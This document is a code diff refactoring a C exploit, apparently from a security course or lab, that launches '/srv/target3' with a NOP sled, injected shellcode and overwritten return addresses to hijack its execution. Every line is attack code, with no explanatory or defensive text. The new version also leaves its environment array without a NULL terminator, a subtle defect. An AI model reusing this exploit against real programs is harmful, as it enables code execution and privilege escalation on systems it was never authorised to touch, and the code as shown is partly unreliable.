@@ -1,39 +1,39 @@
 #include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TGT "/srv/target3"
-#define ESZ 400
-#define NSZ 201
-#define BADDR 0xffffdec0
-#define ROFF 4
+const char* target = "/srv/target3";
+const int envSize = 400;
+const uint32_t baseAddr = 0xffffdec0;
+const int nopSize = 201;
+const char nopChar = 0x90;
+const int retOffset = 4;
 
-void mkenv(char *e) {
-    memset(e, 0x90, ESZ - 1);
-    *((uint32_t *)(e)) = BADDR + ROFF;
-    *((uint32_t *)(e + ROFF)) = BADDR + 2 * ROFF;
-    memcpy(e + NSZ, shellcode, sizeof(shellcode));
-    e[ESZ - 1] = 0;
+const uint32_t startAddr = baseAddr + retOffset;
+const uint32_t secondAddr = baseAddr + 2 * retOffset;
+const char padding[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
+
+void prepEnv(char *e) {
+    memset(e, nopChar, envSize - 1);
+    *((uint32_t *)(e)) = startAddr;
+    *((uint32_t *)(e + retOffset)) = secondAddr;
+    memcpy(e + nopSize, shellcode, sizeof(shellcode));
+    e[envSize - 1] = '\0';
 }
 
-int main() {
-    char *a[3], *e[2], env[ESZ], p[20] = {0};
-    
-    mkenv(env);
-    
-    memset(p, 0x90, 16);
-    *((uint32_t *)(p + 16)) = BADDR;
-    
-    a[0] = TGT;
-    a[1] = p;
-    a[2] = 0;
-    
-    e[0] = env;
-    e[1] = 0;
-    
-    execve(TGT, a, e);
-    write(2, "execve failed.\n", 15);
-    
+int main(void) {
+    char *args[] = {target, padding, NULL};
+    char env[envSize];
+
+    prepEnv(env);
+
+    char *envp[] = {env};
+
+    execve(target, args, envp);
+    fprintf(stderr, "execve failed.\n");
+
     return 0;
 }
